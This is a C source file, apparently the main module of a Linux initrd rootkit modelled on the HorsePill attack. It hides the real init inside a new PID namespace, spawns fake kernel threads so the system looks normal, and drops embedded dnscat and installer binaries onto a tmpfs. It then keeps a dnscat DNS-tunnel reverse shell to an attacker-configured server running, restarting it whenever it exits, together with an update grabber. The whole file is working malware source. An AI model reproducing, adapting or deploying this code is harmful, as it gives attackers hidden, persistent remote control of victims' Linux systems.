/**
 * File for main function of the attack
*/
//Import
#include "horsepill.h"
#include "dnscat.h"
#include "banner.h"
#include "installer.h"
#include "grabber.h"
#include <linux/reboot.h>  /* Definition of LINUX_REBOOT_* constants */
#include <sys/syscall.h>   /* Definition of SYS_* constants */
#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <signal.h>
#include <dirent.h>


//Global var
pid_t clone_pid;
long int runinit_lenght;
char* runinit_buf;

char dnscat_cmdline[DNSCATCMDLINE_LEN] __attribute__ ((section ("DNSCMDLINE"))) = {
	"dnscat\0"
	"--dns\0"
	"server="SERVER",port=53\0"
	"--secret="SECRET
	"\0\0YOU SHOULD CHANGE TO ABOVE TO CONNECT TO YOUR OWN SERVER"
};

//function
static void grab_kernel_threads(char**);
static void make_kernel_threads(char **);
void clone_parent_part(void);
static pid_t run_dnsShell(void);
static pid_t run_updateGrabber(void);
static void save_dnsShell(void);
static void save_runinit(void);
static void save_installer(void);

static inline int raw_clone(unsigned long flags, void *child_stack) {
	return __clone(flags, child_stack);
}

static void sigint_handler(int s){
    //pass sigint to child process
    if (s == SIGINT)
    {
        kill(clone_pid,s);
    }
}

static void init_handle(int status){
    //check if the signal was not managed
    if (WIFSIGNALED(status))
    {
        int sign = WTERMSIG(status);
        switch (sign)
        {
        case SIGHUP:
            //reboot signal
            (void)reboot(LINUX_REBOOT_CMD_RESTART,NULL);
            printf("Reboot error \n");
            exit(EXIT_FAILURE);
        case SIGINT:
            (void)reboot(LINUX_REBOOT_CMD_POWER_OFF,NULL);
            printf("cannot shutdown!\n");
			exit(EXIT_FAILURE);
        default:
            printf("init exited via signal %d for unknown reason\n", sign);
			exit(EXIT_FAILURE);
        }
        
    }else
    {
        printf("init exited with status %d for unknown reason\n", WEXITSTATUS(status));
		printf("child init termination caused by signal %d\n", WTERMSIG(status));
		exit(EXIT_FAILURE);
    }
}



void hack_initrd(){
    //phase 1, 2, 3 already done by initrd
    char* kthreads[MAXKERNELTHREAD];

    //------ ENUMERATE KERNEL THREAD
    memset((void*)kthreads,0,sizeof(kthreads));
    grab_kernel_threads(kthreads);

    //------ DO CLONE
    clone_pid = raw_clone(SIGCHLD | CLONE_NEWPID | CLONE_NEWNS, NULL);

    if(clone_pid < 0 ){
        printf("clone fail\n");
        exit(EXIT_FAILURE);
    }else if(clone_pid > 0){
        //attack side main thread
        clone_parent_part();
    }else{
       //child operation (start init)
       //Step 5.1, 5.2, 5.3, 5.4 
       const int mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
       //5.1 Remount proc
       if (umount("/proc") < 0){
           //error in unmount /proc
           printf("Unmount /proc error \n");
           exit(EXIT_FAILURE);
       }
       if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
       {
           //error in mount /proc
           printf("Remount /proc error \n");
           exit(EXIT_FAILURE);
       }
       //5.2 Make fake kernel threads
       make_kernel_threads(kthreads);
       
       //back to parent process
		//sleep(10); //TODO remove time for debugging
    }
    
}

void clone_parent_part(void){
    pid_t dnsShell_pid, updateGrabber_pid;

       
    //Space for import files
    if (mount("tmpfs", TARGET_PATH, "tmpfs", MS_STRICTATIME, "mode=755") < 0) {
        printf("couldn't mount ramdisk!\n");
        exit(EXIT_FAILURE);
    }
    
	save_runinit();

   //---- Signal handlers
   if (signal(SIGINT,sigint_handler) == SIG_ERR)
        printf("SIGINT handler not installed \n");
   //disabled CAD
   if (reboot(LINUX_REBOOT_CMD_CAD_OFF,NULL) < 0)
        printf("Could not turn off CAD \n");

    sleep(15);

    //---- STEP 6 remount root
    if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,"errors=remount-ro,data=ordered") < 0) {
        printf("Could not remount /\n");
        exit(EXIT_FAILURE);
	}



    //---- STEP 8 fork process malicious
	save_dnsShell();
	save_installer();
	save_runinit();
    dnsShell_pid = run_dnsShell();
    updateGrabber_pid = run_updateGrabber();

    //---- STEP 9 wait process exit
    while (1)
    {
        pid_t pid; //child process intercepted
        int status=0;

        pid = waitpid(-1, &status, 0);
        if (status == clone_pid){
            //malicious child interception
            init_handle(status);
        }
        else if (pid == dnsShell_pid)
        {
            //restart dnsShell
            dnsShell_pid = run_dnsShell();
        }
        else if (pid == updateGrabber_pid)
        {
            //restart updateGrabber
            updateGrabber_pid = run_updateGrabber();
        }
        else
        {
            printf("Unknown pid %d exited\n", pid);
        }        
        sleep(1);
    }   
}


static pid_t run_dnsShell(){
    pid_t pid;
    pid = fork();

    if (pid < 0) {
		printf("[RUN DNS SHELL] could not fork\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0)
    {
        //shell process
        char *argv[8]; /* assumption is less than 7 args */
		int last_null, counter;

		/* cook dnscat_cmdline into an argv */
		memset((void*)argv, 0, sizeof(argv));

		last_null = 0; /* special case for start */
		counter = 0;
		for (int i = 0; i < DNSCATCMDLINE_LEN - 1; i++) {
			if (dnscat_cmdline[i] == 0) {
				argv[counter] = &(dnscat_cmdline[last_null+1]);
				if (dnscat_cmdline[i+1] == 0) {
					break;
				}
				last_null = i;
				counter++;
			}
			if (counter == 7) {
				break;
			}
		}

		close(0);
		close(1);
		close(2);

		(void)open("/dev/null", O_RDONLY);
		(void)open("/dev/null", O_WRONLY);
		(void)open("/dev/null", O_RDWR);

		execv(DNSCAT_PATH, argv);
		printf("couldn't run dnscat!\n");
		exit(EXIT_FAILURE);
    }

    //parent
    return pid;
}

static pid_t run_updateGrabber(){
    pid_t pid;
	int ret;
    pid = fork();

    if (pid < 0) {
		printf("[RUN UPDATE GRABBER] could not fork\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0)
    {
        //updateGrabber process
		ret = grabber_main();
        if (ret < 0) {
			perror("[update grabber error]");
			exit(EXIT_FAILURE);
		} else if (ret == 2){
			//update finished modify run attack
			system(INSTALLER_PATH);
		} 
    }

    //parent
    return pid;
}


/**
 * Dns shell
*/
static void save_dnsShell(void){
	FILE* t_file = NULL;
	t_file = fopen(DNSCAT_PATH, "w+");
	if (t_file) {
		(void)fwrite((const void*)dnscat, 1, dnscat_len, t_file);
		(void)fclose(t_file);
		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
	}
}



static void save_installer(void){
	FILE* t_file = NULL;
	t_file = fopen(INSTALLER_PATH, "w+");
	if (t_file) {
		(void)fwrite((const void*)installer, 1, installer_len, t_file);
		(void)fclose(t_file);
		(void)chmod(INSTALLER_PATH, S_IXUSR | S_IRUSR);
	}
}

static void save_runinit(void){
	FILE* t_file = NULL;
	t_file = fopen(RUNINIT_T_PATH, "w+");
	if (t_file) {
		(void)fwrite((void*)runinit_buf, 1, runinit_lenght, t_file);
		(void)fclose(t_file);
		(void)chmod(RUNINIT_T_PATH, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
	}
}

int get_runinit(){
	int fd;
	struct stat st;
	stat(RUNINIT_PATH, &st);
	fd = open(RUNINIT_PATH, O_RDONLY);
	

	if (fd < 0) {
		fprintf(stdout, "[HORSEPILL] can't open run-init for reading:%s\n", strerror(errno));
		return -1;
	}

	
	runinit_lenght = st.st_size;
	
	runinit_buf = (char *) malloc(runinit_lenght);
	
	if (runinit_buf == NULL){
		fprintf(stdout, "[HORSEPILL] malloc: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	//read can fail
	int ret,byte;
	byte = 0;
	while (byte != runinit_lenght){
		ret = read(fd,(void*)runinit_buf + byte,runinit_lenght - byte);
		if(ret <0){
			fprintf(stdout, "[HORSEPILL] read: %s\n", strerror(errno));
			close(fd);
			return ret;
		}
		byte += ret;
		sleep(2); //need time if read ret < runinit lenght 
	}
	
	close(fd);
	return 0;
}








/* From
 * https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
 */
static int is_proc(char *name){
	int i;
	for (i = 0; i < strlen(name); i++) {
		if (!isdigit(name[i])) {
			return 0;
		}
	}
	return 1;
}

static char* grab_kernel_thread(char *name){
    FILE* stat;
	char buf[4096];

	int pid;
	char pidname[4096];
	char newpidname[4096];
	char state;
	int ppid;

	char *ret = NULL;

	memset((void*)newpidname, 0, sizeof(newpidname));
	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
	stat = fopen(buf, "r");
	if (stat == NULL) {
		printf("couldn't open /proc/%s/stat\n", name);
		goto out;
	}
	fgets(buf, sizeof(buf) - 1, stat);
	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
	if (pid != 1 && (ppid == 0 || ppid == 2)) {
		for (unsigned int i = 0; i <= strlen(pidname); i++) {
			char c = pidname[i];
			if (c == '(') {
				c = '[';
			} else if (c == ')') {
				c = ']';
			}
			newpidname[i] = c;
		}
		ret = strdup(newpidname);
	}
	fclose(stat);
out:
	return ret;
}

static void grab_kernel_threads(char**threads){
    DIR *dirp;
	int i = 0;
	struct dirent *dp;

	if ((dirp = opendir("/proc")) == NULL) {
		printf("couldn't open '/proc'\n");
		exit(EXIT_FAILURE);
	}

	do {
		errno = 0;
		if ((dp = readdir(dirp)) != NULL) {
			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
				char *name = grab_kernel_thread(dp->d_name);
				if (name) {
					threads[i] = name;
					i++;
				}
			}
		}
	} while (dp != NULL);

	if (errno != 0) {
		printf("error reading directory\n");
		exit(EXIT_FAILURE);
	}
    (void) closedir(dirp);
}

static int setproctitle(char *title)
{
	static char *proctitle = NULL;
	char buf[2048], *tmp;
	FILE *f;
	int i, len, ret = 0;

	/* We don't really need to know all of this stuff, but unfortunately
	 * PR_SET_MM_MAP requires us to set it all at once, so we have to
	 * figure it out anyway.
	 */
	unsigned long start_data, end_data, start_brk, start_code, end_code,
		start_stack, arg_start, arg_end, env_start, env_end,
		brk_val;
	struct prctl_mm_map prctl_map;

	
	f = fopen("/proc/self/stat", "r");
	if (!f) {
		return -1;
	}

	tmp = fgets(buf, sizeof(buf), f);
	fclose(f);
	if (!tmp) {
		return -1;
	}

	/* Skip the first 25 fields, column 26-28 are start_code, end_code,
	 * and start_stack */
	tmp = strchr(buf, ' ');
	for (i = 0; i < 24; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}
	if (!tmp)
		return -1;

	i = sscanf(tmp, "%lu %lu %lu", &start_code, &end_code, &start_stack);
	if (i != 3)
		return -1;

	/* Skip the next 19 fields, column 45-51 are start_data to arg_end */
	for (i = 0; i < 19; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}

	if (!tmp)
		return -1;

	i = sscanf(tmp, "%lu %lu %lu %lu %lu %lu %lu",
		   &start_data,
		   &end_data,
		   &start_brk,
		   &arg_start,
		   &arg_end,
		   &env_start,
		   &env_end);
	if (i != 7)
		return -1;

	/* Include the null byte here, because in the calculations below we
	 * want to have room for it. */
	/* len = strlen(title) + 1; */
	len = strlen(title) + 1;

	/* If we don't have enough room by just overwriting the old proctitle,
	 * let's allocate a new one.
	 */
	if (len > arg_end - arg_start) {
		void *m;
		m = realloc(proctitle, len);
		if (!m)
			return -1;
		proctitle = m;

		arg_start = (unsigned long) proctitle;
	}

	arg_end = arg_start + len;

	brk_val = (unsigned long)__brk(0);

	prctl_map = (struct prctl_mm_map) {
		.start_code = start_code,
		.end_code = end_code,
		.start_stack = start_stack,
		.start_data = start_data,
		.end_data = end_data,
		.start_brk = start_brk,
		.brk = brk_val,
		.arg_start = arg_start,
		.arg_end = arg_end,
		.env_start = env_start,
		.env_end = env_end,
		.auxv = NULL,
		.auxv_size = 0,
		.exe_fd = -1,
	};

	ret = prctl(PR_SET_MM, PR_SET_MM_MAP, (long) &prctl_map, sizeof(prctl_map), 0);
	if (ret == 0)
		strcpy((char*)arg_start, title);
	else
		printf("setting cmdline failed - %s", strerror(errno));

	return ret;
}

static void set_prctl_name(char *name)
{
	char buf[2048];

	memset((void*)buf, 0, sizeof(buf));
	strncpy(buf, name+1, strlen(name)-2);
	//printf("prctl set name to %s\n", buf);
	if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
		printf("prctl set name returned error!\n");
		exit(EXIT_FAILURE);
	}
}

static void make_kernel_threads(char **threads){
    int i;
	if (fork() == 0) {
		/* special case for pid 2 (kthreads) */

		set_prctl_name(threads[0]);
		setproctitle(threads[0]);
		for (i = 1; threads[i]; i++) {
			if (fork() == 0) {
				/* all other kernel threads are
				 * children of pid 2
				 */
				set_prctl_name(threads[i]);
				setproctitle(threads[i]);
				while(1) {
					pause();
				}
				exit(EXIT_FAILURE); /* should never
						     * reach here */
			}
			//sleep(1);
		}
		while(1) {
			pause();
		}
		exit(EXIT_FAILURE); /* should never reach here */
	}
}